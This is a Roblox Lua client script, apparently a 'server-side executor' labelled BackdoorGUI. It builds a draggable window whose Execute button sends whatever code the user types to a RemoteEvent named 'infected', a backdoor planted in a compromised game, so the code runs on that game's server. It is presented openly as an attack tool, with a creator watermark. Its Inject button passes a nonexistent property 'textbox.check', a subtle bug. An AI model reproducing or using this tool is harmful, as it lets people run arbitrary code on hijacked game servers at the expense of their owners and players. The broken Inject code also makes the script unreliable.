local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local check = 'print("Hello, world!")'

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BackdoorGUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Toggle Button (always visible)
local toggleButton = Instance.new("ImageButton")
toggleButton.Name = "ToggleButton"
toggleButton.Size = UDim2.new(0, 30, 0, 30)
toggleButton.Position = UDim2.new(0, 10, 0, 10)
toggleButton.BackgroundTransparency = 1
toggleButton.Image = "rbxassetid://6031091002" -- Replace with your own image if desired
toggleButton.Parent = screenGui

-- Add Click Sound to Toggle Button
local clickSound = Instance.new("Sound")
clickSound.Name = "ClickSound"
clickSound.SoundId = "rbxassetid://87437544236708"  -- Basic click sound
clickSound.Volume = 0.7
clickSound.Parent = toggleButton

-- Watermark (bottom-left)
local watermark = Instance.new("TextLabel")
watermark.Name = "Watermark"
watermark.Size = UDim2.new(0, 250, 0, 20)
watermark.Position = UDim2.new(0, 10, 1, -30)
watermark.BackgroundTransparency = 1
watermark.Text = "Made by @vinchiqqq on TikTok"
watermark.TextColor3 = Color3.new(1, 1, 1)
watermark.TextTransparency = 0.8
watermark.Font = Enum.Font.SourceSans
watermark.TextSize = 14
watermark.TextXAlignment = Enum.TextXAlignment.Left
watermark.TextYAlignment = Enum.TextYAlignment.Bottom
watermark.Parent = screenGui

-- GUI container for all other elements
local guiContainer = Instance.new("Frame")
guiContainer.Name = "GUIContainer"
guiContainer.Size = UDim2.new(1, 0, 1, 0)
guiContainer.BackgroundTransparency = 1
guiContainer.Parent = screenGui

-- Helper to create outline frames
local function createOutlineFrame(size, position, parent, cornerRadius)
  local outline = Instance.new("Frame")
  outline.Size = size
  outline.Position = position
  outline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
  outline.BorderSizePixel = 0
  outline.Parent = parent

  local outlineCorner = Instance.new("UICorner")
  outlineCorner.CornerRadius = cornerRadius or UDim.new(0, 10)
  outlineCorner.Parent = outline

  return outline
end

-- Title Bar Outline
local titleOutline = createOutlineFrame(UDim2.new(0, 400, 0, 40), UDim2.new(0.5, -200, 0.5, -175), guiContainer, UDim.new(0, 10))

-- Title Bar (fills titleOutline with padding)
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, -4, 1, -4) -- Slightly smaller to fit inside the black outline with padding
titleBar.Position = UDim2.new(0, 2, 0, 2)
titleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
titleBar.BorderSizePixel = 0
titleBar.Parent = titleOutline

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 10)
titleCorner.Parent = titleBar

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, 0, 1, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "@vinchiqqq SS"
titleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextSize = 24
titleLabel.Parent = titleBar

-- Main Frame Outline
local frameOutline = createOutlineFrame(UDim2.new(0, 400, 0, 250), UDim2.new(0.5, -200, 0.5, -125), guiContainer, UDim.new(0, 10))

-- Main Frame (fills frameOutline with padding)
local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(1, -4, 1, -4)
frame.Position = UDim2.new(0, 2, 0, 2)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderSizePixel = 0
frame.Parent = frameOutline

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 10)
frameCorner.Parent = frame

-- TextBox Outline inside Main Frame with padding
local textboxOutline = createOutlineFrame(UDim2.new(1, -20, 0, 150), UDim2.new(0, 10, 0, 10), frame, UDim.new(0, 8))

local textbox = Instance.new("TextBox")
textbox.Name = "CodeBox"
textbox.Size = UDim2.new(1, -4, 1, -4)
textbox.Position = UDim2.new(0, 2, 0, 2)
textbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
textbox.BorderSizePixel = 0
textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
textbox.Font = Enum.Font.SourceSans
textbox.TextSize = 18
textbox.TextWrapped = true
textbox.ClearTextOnFocus = false
textbox.MultiLine = true
textbox.Text = "-- Type your script here"
textbox.Parent = textboxOutline

local textboxCorner = Instance.new("UICorner")
textboxCorner.CornerRadius = UDim.new(0, 8)
textboxCorner.Parent = textbox

-- Buttons container
local buttonsFrame = Instance.new("Frame")
buttonsFrame.Name = "ButtonsFrame"
buttonsFrame.Size = UDim2.new(1, -20, 0, 50)
buttonsFrame.Position = UDim2.new(0, 10, 1, -60)
buttonsFrame.BackgroundTransparency = 1
buttonsFrame.Parent = frame

-- Button creator
local function createButton(name, text, position)
  local btnOutline = Instance.new("Frame")
  btnOutline.Name = name .. "Outline"
  btnOutline.Size = UDim2.new(0, 120, 1, 0)
  btnOutline.Position = position
  btnOutline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
  btnOutline.BorderSizePixel = 0
  btnOutline.Parent = buttonsFrame

  local outlineCorner = Instance.new("UICorner")
  outlineCorner.CornerRadius = UDim.new(0, 8)
  outlineCorner.Parent = btnOutline

  local btn = Instance.new("TextButton")
  btn.Name = name
  btn.Size = UDim2.new(1, -4, 1, -4)
  btn.Position = UDim2.new(0, 2, 0, 2)
  btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  btn.BorderSizePixel = 0
  btn.Text = text
  btn.TextColor3 = Color3.fromRGB(0, 0, 0)
  btn.Font = Enum.Font.SourceSansBold
  btn.TextSize = 20
  btn.Parent = btnOutline

  local btnCorner = Instance.new("UICorner")
  btnCorner.CornerRadius = UDim.new(0, 8)
  btnCorner.Parent = btn

  return btn
end

-- Create buttons
local btnExecute = createButton("Execute", "Execute", UDim2.new(0, 0, 0, 0))
local btnClear = createButton("Clear", "Clear", UDim2.new(0, 130, 0, 0))
local btnInject = createButton("Inject", "Inject", UDim2.new(0, 260, 0, 0))

-- Infected Remote
local function getInfectedRemote()
  return ReplicatedStorage:FindFirstChild("infected")
end

btnClear.MouseButton1Click:Connect(function()
  textbox.Text = ""
end)

btnInject.MouseButton1Click:Connect(function()
  local remote = getInfectedRemote()
  if remote and remote:IsA("RemoteEvent") then
    remote:FireServer(textbox.check)
  else
    warn("RemoteEvent 'infected' not found in ReplicatedStorage!")
  end
end)

btnExecute.MouseButton1Click:Connect(function()
  local remote = getInfectedRemote()
  if remote and remote:IsA("RemoteEvent") then
    remote:FireServer(textbox.Text)
  else
    warn("RemoteEvent 'infected' not found in ReplicatedStorage!")
  end
end)

-- Dragging support
local UserInputService = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos

local function update(input)
  local delta = input.Position - dragStart
  frameOutline.Position = UDim2.new(
    startPos.X.Scale,
    startPos.X.Offset + delta.X,
    startPos.Y.Scale,
    startPos.Y.Offset + delta.Y
  )
  titleOutline.Position = UDim2.new(
    startPos.X.Scale,
    startPos.X.Offset + delta.X,
    startPos.Y.Scale,
    startPos.Y.Offset + delta.Y - 50
  )
end

frameOutline.InputBegan:Connect(function(input)
  if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
    dragging = true
    dragStart = input.Position
    startPos = frameOutline.Position

    input.Changed:Connect(function()
      if input.UserInputState == Enum.UserInputState.End then
        dragging = false
      end
    end)
  end
end)

frameOutline.InputChanged:Connect(function(input)
  if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
    dragInput = input
  end
end)

UserInputService.InputChanged:Connect(function(input)
  if input == dragInput and dragging then
    update(input)
  end
end)

-- Toggle GUI visibility with click sound
local visible = true
toggleButton.MouseButton1Click:Connect(function()
  clickSound:Play()
  visible = not visible
  guiContainer.Visible = visible
end)
